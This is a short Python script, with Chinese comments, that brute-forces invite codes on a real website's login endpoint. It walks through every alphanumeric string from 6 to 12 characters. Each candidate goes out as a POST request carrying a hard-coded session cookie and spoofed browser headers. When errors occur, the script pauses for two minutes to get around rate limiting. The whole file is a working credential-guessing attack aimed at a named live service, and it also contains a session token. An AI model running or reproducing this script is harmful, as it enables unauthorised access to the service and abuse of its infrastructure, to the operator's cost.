import time
import requests
import itertools
import string
import sys
from tqdm import tqdm


def req_code(code):

    url = "https://www.deephire.cn/wapi/user/auth/login/invite-code"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Cookie": "t_dh=NzBmY2Y1NDctZDU3Yi00ZTI4LThiMjItYjM5ODg5NmNiM2E1",
        "Origin": "https://www.deephire.cn",
        "Referer": "https://www.deephire.cn/invite-code",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    }

    data = {"code":code}

    response = requests.post(url, headers=headers, json=data)

    if response.status_code == 200:
        if response.json()['code'] != 400:
            print("请求成功:", response.json())
    # else:
    #     print("请求失败:", response.status_code, response.text)

# 创建可能的字符集合（数字 + 大写字母 + 小写字母）
characters = string.digits + string.ascii_letters
min_length = 6
max_length = 12

# 计算总组合数量
total_combinations = sum(len(characters) ** length for length in range(min_length, max_length + 1))

# 初始化计数器
count = 0

# 使用 tqdm 显示实时进度条
for length in range(min_length, max_length + 1):
    for code in tqdm(itertools.product(characters, repeat=length), total=len(characters) ** length, desc=f'长度: {length}'):
        invite_code = ''.join(code)
        try:
            req_code(invite_code)
        except:
            time.sleep(120)
        count += 1  # 每生成一个邀请码，计数器加一

